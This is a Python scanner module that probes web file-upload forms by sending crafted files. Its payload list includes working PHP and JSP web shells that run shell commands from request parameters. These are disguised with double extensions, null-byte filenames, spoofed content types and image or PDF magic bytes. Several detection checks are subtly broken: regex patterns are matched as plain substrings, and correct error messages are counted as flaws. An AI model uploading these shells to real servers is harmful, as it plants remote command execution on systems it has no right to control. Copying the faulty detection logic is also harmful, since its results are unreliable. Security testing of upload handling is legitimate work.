#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
import mimetypes
import base64
from RAGScripts.utils.logger import setup_scanner_logger

async def check_file_upload_vulnerabilities(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for file upload vulnerabilities
        test_cases = [
            {
                'name': 'Extension Bypass',
                'files': [
                    ('malicious.php.jpg', 'text/jpeg', '<?php echo "test"; ?>'),
                    ('shell.aspx.png', 'image/png', '<asp:WebControl runat="server">'),
                    ('exploit.jsp.gif', 'image/gif', '<%@ page import="java.io.*" %>'),
                    ('backdoor.phtml.pdf', 'application/pdf', '<?php system($_GET["cmd"]); ?>'),
                    ('webshell.php%00.jpg', 'image/jpeg', '<?php eval($_POST["code"]); ?>')
                ]
            },
            {
                'name': 'Content Type Spoofing',
                'files': [
                    ('exploit.php', 'image/jpeg', '<?php phpinfo(); ?>'),
                    ('shell.asp', 'image/png', '<%Response.Write(Server.MapPath("."))%>'),
                    ('cmd.jsp', 'image/gif', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'),
                    ('exec.php', 'application/pdf', '<?php echo shell_exec($_GET["cmd"]); ?>'),
                    ('rce.php', 'text/plain', '<?php system($_REQUEST["cmd"]); ?>')
                ]
            },
            {
                'name': 'Metadata Injection',
                'files': [
                    ('image.jpg', 'image/jpeg', '<?php __halt_compiler();?>JFIF<?php ?>'),
                    ('doc.pdf', 'application/pdf', '%PDF-1.4<?php system($_GET["cmd"]); ?>'),
                    ('file.gif', 'image/gif', 'GIF89a<?php passthru($_GET["cmd"]); ?>'),
                    ('test.png', 'image/png', '\x89PNG\r\n<?php eval($_POST["x"]); ?>'),
                    ('data.bmp', 'image/bmp', 'BM<?php include($_GET["file"]); ?>')
                ]
            },
            {
                'name': 'Size Validation',
                'files': [
                    ('large.jpg', 'image/jpeg', 'A' * 10485760),  # 10MB
                    ('zero.pdf', 'application/pdf', ''),
                    ('small.gif', 'image/gif', 'GIF87a'),
                    ('huge.png', 'image/png', 'B' * 20971520),  # 20MB
                    ('tiny.bmp', 'image/bmp', 'BM')
                ]
            }
        ]
        
        # Extract form parameters and file upload fields
        upload_fields = extract_upload_fields(initial_response)
        
        for field_name in upload_fields:
            for test in test_cases:
                for filename, content_type, content in test['files']:
                    try:
                        files = {
                            field_name: (
                                filename,
                                content.encode(),
                                content_type
                            )
                        }
                        
                        response = requests.request(
                            method,
                            test_url,
                            files=files,
                            timeout=10
                        )
                        
                        if is_upload_vulnerable(response, test, filename):
                            findings.append({
                                "type": "File Upload Vulnerability",
                                "detail": f"Potential {test['name']} vulnerability",
                                "evidence": {
                                    "url": test_url,
                                    "field": field_name,
                                    "filename": filename,
                                    "content_type": content_type,
                                    "status_code": response.status_code,
                                    "response": response.text[:200]
                                }
                            })
                            
                    except requests.exceptions.RequestException:
                        continue
                    
    except Exception as e:
        print(f"Error in file upload check: {str(e)}")
    
    return findings

def extract_upload_fields(response: requests.Response) -> List[str]:
    fields = []
    
    try:
        content = response.text
        # Find file input fields
        file_pattern = r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']'
        fields.extend(re.findall(file_pattern, content))
        
        # Find multipart form fields
        form_pattern = r'<form[^>]+enctype=["\']multipart/form-data["\'][^>]*>.*?</form>'
        for form in re.finditer(form_pattern, content, re.DOTALL):
            form_content = form.group(0)
            fields.extend(re.findall(file_pattern, form_content))
    except:
        pass
    
    return list(set(fields))

def is_upload_vulnerable(response: requests.Response, test: Dict, filename: str) -> bool:
    try:
        response_text = response.text.lower()
        
        # Check for successful file upload
        if response.status_code in [200, 201]:
            # Check for extension bypass
            if test['name'] == 'Extension Bypass':
                success_patterns = [
                    'upload.*success',
                    'file.*saved',
                    'uploaded.*successfully',
                    filename.lower()
                ]
                if any(pattern in response_text for pattern in success_patterns):
                    return True
            
            # Check for content type spoofing
            if test['name'] == 'Content Type Spoofing':
                if 'image' in response_text or 'file.*type' in response_text:
                    return True
            
            # Check for metadata injection
            if test['name'] == 'Metadata Injection':
                if 'image.*processed' in response_text or 'file.*processed' in response_text:
                    return True
            
            # Check for size validation bypass
            if test['name'] == 'Size Validation':
                if 'file.*uploaded' in response_text and not 'too.*large' in response_text:
                    return True
        
        # Check for error messages that might indicate vulnerability
        error_patterns = [
            'invalid.*extension',
            'file.*type.*not.*allowed',
            'size.*exceeded',
            'upload.*failed'
        ]
        
        if any(re.search(pattern, response_text) for pattern in error_patterns):
            if response.status_code != 400:  # Expect 400 for proper error handling
                return True
        
    except:
        pass
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_file_upload_vulnerabilities(
            "http://localhost:5000",
            "/upload",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())